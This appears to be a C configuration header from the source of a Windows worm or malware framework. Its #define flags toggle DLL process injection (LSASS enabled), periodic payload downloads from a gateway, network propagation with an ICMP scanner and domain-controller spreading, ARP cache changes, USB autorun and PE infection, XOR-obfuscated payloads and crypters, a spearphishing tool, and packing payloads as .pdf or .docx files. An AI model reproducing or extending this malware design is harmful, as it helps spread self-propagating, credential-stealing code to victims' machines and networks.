/********************************************************************/
/*		PROGRAM CONFIGURATIONS										*/
/********************************************************************/
/*	Allows the CORE DLLs to worm locally */
#define DLL_REPLICATION									// Local DLL Replication (process injection)

/*	Interval at which the gateway is contacted to download the newest payload */
#define GATEWAY_PAYLOAD_UPDATE		10000

/*	Installs the Global Exception Handler */
#define ENABLE_GLOBAL_EXCEPTION_HANDLER

/*	Disables local DLL propagation in svchost */
#define DISABLE_SVCHOST_INFECTION

/*	Elevate CORE64 to debug mode */
#define ELEVATE_CORE64_DEBUG


/********************************************************************/
/*		nTM CONFIGS													*/
/********************************************************************/
/*	Starts the nTM Operations */
#define nTM

/*	Disable nTM on x64 */
#if defined(_WIN64)
//#define DISABLE_NTM64
#endif

/*	Starts the Gateway fetching thread */
#if defined(DISABLE_NTM64)
//#define DOWNLOAD_URL_LIST
#else
#define DOWNLOAD_URL_LIST
#endif

/*	Starts the nTM engine on PDC/DCs */
//#define PDC_WORMING

/*	Starts the ICMP Scanner thread */
#if defined(DISABLE_NTM64)
//#define ICMP_SCAN
#else
#define ICMP_SCAN //DISABLING THIS WILL CAUSE A CRASH AFTER ONE nTM TARGET
#endif

/* Generate the text checksum (obsolete */
//#ifdef GENERATE_TEXT_CHECKSUM

/*	Enables the ICMP Scanner on PDC/DCs */
//#define ENABLE_DC_NET_SCANNING

/*	Modifies the ARP Cache renewal timeout */
#define MODIFY_ARP_CACHE_RENEW

/*	Install the TFTP client on target */
//#define INSTALL_TFTP_CLIENT

/*	Waits for the pkgmgr to complete operations (use with INSTALL_TFTP_CLIENT) */
//#define WAIT_FOR_PKGMGR


/********************************************************************/
/*		USB FEATURES												*/
/********************************************************************/
/*	Perform any USB Operation */
#define USB_OPS			

/*	Utilize the USB Wrapper */
#define USB_OPS_WRAPPER

/*	Install the USB Wrapper Resource (depreciated)*/
//#define USB_OPS_WRAPPER_RSRC

/*	Utilizes the USB Wrapper RTO Engine */
#define INVOKE_RTO

/*	XOR the paylaod at the wrapper PE EOF */
//#define WRAP_XOR_PAYLOAD

/*	Appends the datetime on USB Wrapped files */
#define INVOKE_FILENAME_DATE_APPEND

/*	Uses the xTG Mutator on the USB Wrapped files (depreciated)*/
//#define INVOKE_XTG_WRAPPER

/*	Utilize the USB PE Infector */
//#define USB_OPS_PE_INFECTOR

/*	Install USB Autorun */
#define USB_OPS_AUTORUN

/*	Crypting functionality (depreciated)*/
//#define INVOKE_CRYPTER

/*	Infect floppy drives (A: and B:) */
//#define USB_INFECT_FLOPPY

/*	USB Do not infect same wrapped files */
//#define USB_DO_NOT_REINFECT

/*	Disable probability checker on wrapper */
#define DISABLE_PROBABILITY_CHECK

/*	Enable KPCOE crypter routine (depreciated) */
//#define USB_KPCOE

/* Disable spearphisher tool */
#define DISABLE_SPEARPHISHER


/********************************************************************/
/*		DEBUGGING													*/
/********************************************************************/
/*	Utilizes the Primary Debug Channel */
//#define DEBUG_OUT

/*	Nice output, a lot less verbose */
//#define NICE_DEBUG

/*	Utilizes the Debugging subroutine after the CORE DLL is called */
#define	ENTRY_DEBUG

/* Debugging on the skeleton executable (wrapper) */
#define DEBUG_SKEL

/*	Forces CORE32 Libraries to be loaded in x64 Systems */
//#define X86_OVERRIDE									

/*	Routes all DEBUG_OUT Calls to DebugView */
//#define REROUTE_TO_DBGPRINT				

/*	Routes all DEBUG_OUT calls to DebugLogger */
//#define DEBUG_FILE_LOGGER

/*	Forces all CORE DLL functionality to be executed from the Dropper */
//#define DEBUG_OVERRIDE_INJECTOR		

/*	Sleeps after one Local DLL replication */
//#define SLEEP_AFTER_ONE_REP

/*	Disables Local DLL IAT Resolvers - Used with raw CORE debugging*/
//#define DISABLE_CORE_IAT_RESOLVERS

/* Do not perform encryption on the CORE DLL data (lists and user config) */
//#define DO_NOT_ENCRYPT_CORE_DATA

/* Prints all tokens found by nTM */
//#define DEBUG_PRINT_ALL_TOKENS

/* Prints the number of tokens found   */
#define DEBUG_PRINT_NUMBER_OF_TOKENS

/* Do not use NtCreateThreadEx */
//#define DO_NOT_USE_NTCREATETHREADEX

/********************************************************************/
/*		MEMORY RESIDENCY											*/
/********************************************************************/
/* Standard infection on explorer.exe and svchost.exe */
#define REPLICATE_STANDARD			FALSE			

/* Injects to everything */
#define REPLICATE_TO_ALL_PIDS		FALSE	
#define REPLICATE_TO_NOTEPAD		FALSE
#define REPLICATE_TO_EXPLORER		FALSE
#define REPLICATE_TO_FIREFOX		FALSE
#define REPLICATE_TO_OPERA			FALSE
#define REPLICATE_TO_LSASS			TRUE
#define REPLICATE_TO_LOCAL_EXPLORER	FALSE
#define REPLICATE_TO_MSN			FALSE
#define REPLICATE_TO_PIDGIN			FALSE


/********************************************************************/
/*		FILE PACKER													*/
/********************************************************************/
#define PACK_INDEX_PDF		0
#define PACK_INDEX_DOCX		1

#define	PACK_PDF			".pdf"
#define PACK_DOCX			".docx"

#define PACK_EXTENSIONS		{PACK_PDF,  \
							PACK_DOCX}

// .text			// shellcode		VA 0x1000, RAW 0x1000
// .data			// shellcode data	VA 0x2000, RAW 0x2000
// .xdata			// xTG (x)			VA 0x3000, RAW 0x3000
// .rdata			// xTG (r)			VA 0x4000, RAW 0x4000
// .payload			// Raw Payload		VA 0x5000, RAW 0x5000
// .rsrc


// XOR key for the icon data
#define ICON_DATA_XOR_KEY			0xbaafd33d